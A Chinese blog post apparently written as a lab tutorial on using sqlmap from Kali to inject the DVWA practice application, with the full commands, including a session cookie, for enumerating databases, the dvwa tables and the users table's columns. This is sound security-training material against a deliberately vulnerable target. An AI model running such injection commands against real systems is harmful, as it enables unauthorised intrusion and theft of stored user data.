---
title: 利用sqlmap注入dvwa
date: 2019-10-13 11:17:30
tags: [sql注入]
categories: sql注入
---

利用sqlmap对dvwa进行注入。

<!--more-->

kali自带sqlmap，在主机安装DVWA

DVWA的安装：

http://www.dvwa.co.uk/

进入网址，下载zip，解压到www目录下，修改www/DVWA/config/config.inc.php中的数据库密码

浏览器进入localhost/DVWA/输入默认用户名admin,密码password，然后点击页面上的“create/reset database”就可以完成了，将DVWA security改成非impossible

![LBPT_7ZN9O_Z6Z_9_9_GJCN.png](https://i.loli.net/2019/10/13/Yr1mnjIOKhF3fJD.png)

在kali上上启动sqlmap，由于我是虚拟机上运行的sqlmap，只需要将localhost换成主机IP即可

开始注入url:

```bash
sqlmap -u "http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0"
```

由于这个注入页面需要登陆，所以还得加上cookie(chrome下cookie导出工具editthiscookie),过程中会不断让输入Y/N，可以加上参数--batch，来自动填写默认值。

![_GCJPZ3_5T3T97_6K37__QN.png](https://i.loli.net/2019/10/13/6X3MUkLP5Nftz2e.png)

得到数据库类型版本信息(mysql)，服务器类型版本信息(apache，php)

用--dbs查看数据库名

```bash
sqlmap -u "http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0" --batch --dbs
```

![7QU2_IR5VYECTF~_V~QPQ_6.png](https://i.loli.net/2019/10/13/JoAiTGRt9q4FNeL.png)

得到6个数据库名

用--D xxx查看指定数据库，--tables查看数据库中表信息

```bash
sqlmap -u "http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0" --batch -D dvwa --tables
```

![__O`CQDEB_3S_A_WIYRY089.png](https://i.loli.net/2019/10/13/3sNWgyEmRpejlhI.png)

得到了数据库dvwa的所有表名

用--T xxx查看指定表，--columns查看表的列信息

```bash
sqlmap -u "http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0" --batch -D dvwa -T users --columns
```

![_K_TD7~IC_AW_D_~656GBNQ.png](https://i.loli.net/2019/10/13/3xNvIqEUPbjOCJM.png)

得到了数据库dvwa中表users的数据信息

注入成功！